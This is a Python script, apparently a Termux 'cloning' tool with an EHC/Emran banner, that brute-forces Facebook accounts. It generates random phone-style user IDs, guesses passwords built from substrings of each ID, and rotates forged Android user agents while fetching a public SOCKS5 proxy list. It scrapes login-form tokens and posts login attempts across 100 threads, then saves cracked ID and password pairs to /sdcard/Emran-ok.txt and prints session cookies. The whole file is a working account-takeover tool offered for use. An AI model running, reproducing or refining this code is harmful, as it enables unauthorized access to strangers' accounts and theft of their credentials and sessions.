#!/usr/bin/python3
import os,re,sys,random,string,time
from os import system as EHC
try:
    import requests
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
logo="""                                                           
\033[38;5;46m8888888888 \033[33;1m888    888  \033[38;5;46m.d8888b.  
\033[38;5;46m888        \033[33;1m888    888 \033[38;5;46md88P  Y88b 
\033[38;5;46m888        \033[33;1m888    888 \033[38;5;46m888    8N8 
\033[38;5;46m8888888    \033[33;1m8888888888 \033[38;5;46m888        
\033[38;5;46m888        \033[33;1m888    888 \033[38;5;46m888        
\033[38;5;46m888        \033[33;1m888    888 \033[38;5;46m888    888 
\033[38;5;46m888        \033[33;1m888    888 \033[38;5;46mY88b  d88P 
\033[38;5;46m8888888888 \033[33;1m888    888  \033[38;5;46m"Y8888P" 
-------------------------------------"""
def line():
    print("\033[34;1m—"*36)
def ehcemran():
    emran=[]
    EHC("clear")
    print(logo)    
    print(" 〱𝐄𝐗𝐀𝐌𝐏𝐋𝐄:➨\033[33;1m〱𝟎𝟏𝟖〱𝟎𝟏𝟕〱𝟎𝟏𝟗〱𝟎𝟏𝟔〱𝟎𝟏𝟓")   
    ehc_code=input(" 〱𝐂𝐇𝐎𝐈𝐂𝐄:➨")
    line()
    print(" 〱𝐄𝐗𝐀𝐌𝐏𝐋𝐄: \033[33;1m〱𝟏𝟎𝟎𝟎〱𝟐𝟎𝟎𝟎〱𝟑𝟎𝟎𝟎〱𝟒𝟎𝟎𝟎")
    ehc_lim=int(input(" 〱𝐂𝐇𝐎𝐈𝐂𝐄:➨ "))
    line()
    for z in range(ehc_lim):
        co=''.join(random.choice(string.digits) for _ in range(8))
        emran.append(co)
        print(" \033[35;1m[𝟎𝟏]\033[37;1m╔═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐌")
        print(" \033[35;1m[𝟎𝟐]\033[37;1m╠═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐌𝐁𝐀𝐒𝐈𝐂")
        print(" \033[35;1m[𝟎𝟑]\033[37;1m╠═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐅𝐑𝐄𝐄")
        print(" \033[35;1m[𝟎𝟒]\033[37;1m╠═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐏")
        print(" \033[35;1m[𝟎𝟓]\033[37;1m╠═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐗")
        print(" \033[35;1m[𝟎𝟔]\033[37;1m╚═〔𝐒𝐄𝐑𝐕𝐄𝐑〱\033[38;5;46m𝐓𝐎𝐔𝐂𝐇")                     
    line()
    gxd=input(" 〱𝐂𝐇𝐎𝐈𝐂𝐄:➨")
    if gxd in ["1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        EHC("clear")
        print(logo)
        tl=str(len(emran))
        print(" \033[35;1m-------------------------------------")
        print(" \033[35;1m[𝟎𝟏]\033[37;1m╔═〔𝐍𝐀𝐌𝐄    ╔═〔\033[38;5;46m𝐄𝐌𝐑𝐀𝐍")
        print(" \033[35;1m[𝟎𝟐]\033[37;1m╠═〔𝐆𝐈𝐓𝐇𝐔𝐁  ╠═〔\033[38;5;46m𝐄𝐇𝐂-𝐂𝐘𝐁𝐄𝐑")
        print(" \033[35;1m[𝟎𝟑]\033[37;1m╠═〔𝐖𝐎𝐑𝐊𝐈𝐍𝐆 ╠═〔\033[38;5;46m𝐖𝐈𝐅𝐈 𝐃𝐀𝐓𝐀")
        print(" \033[35;1m[𝟎𝟒]\033[37;1m╠═〔𝐓𝐎𝐎𝐋    ╠═〔\033[38;5;46m𝐏𝐀𝐈𝐃-𝐕𝐈𝐏 𝐑𝐀𝐍𝐃𝐎𝐌")
        print(" \033[35;1m[𝟎𝟓]\033[37;1m╠═〔𝐔𝐏𝐃𝐀𝐓𝐄  ╠═〔\033[38;5;46m𝐀𝐏𝐈")
        print(" \033[35;1m[𝟎𝟔]\033[37;1m╠═〔𝐖𝐎𝐑𝐊𝐈𝐍𝐆 ╠═〔\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇")                
        print(f"\033[35;1m [𝟎𝟖]\033[37;1m╚═〔𝐃𝐀𝐓𝐄    ╚═〔\033[38;5;196m\033[38;5;49m{tl} \033[38;5;50m[{dateti}]")
        print(" \033[35;1m-------------------------------------")
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mEmran-ok.txt")
        line()
        for id in emran:
            uid=ehc_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8            
            pwx.append(uid[2:])#back 11
            pwx.append(uid[1:])#back 10
            pwx.append(uid[9:])#back 9            
            pwx.append(uid[10:])#back 12
            pwx.append(uid[11:])#back 13
            pwx.append(uid[12:])#back 14
            pwx.append(uid[13:])#back 15
            pwx.append(uid[14:])#back 16
            pwx.append(uid[15:])#back 17
            pwx.append(uid[16:])#back 18
            pwx.append(uid[17:])#back 19                                  
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[33;1m[EMRAN-EHC] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            uuu=random.choice(ugen)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]               
                print(f"\r\r\033[34;1m[EMRAN-OK] \033[34;1m{xd} | {ps}  \n\033[31;1m[COOKIES] \033[38;5;46mmsb={sort}\n\033[33;1m———————————————————————————————————— ")
                open("/sdcard/Emran-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(3)
ehcemran()



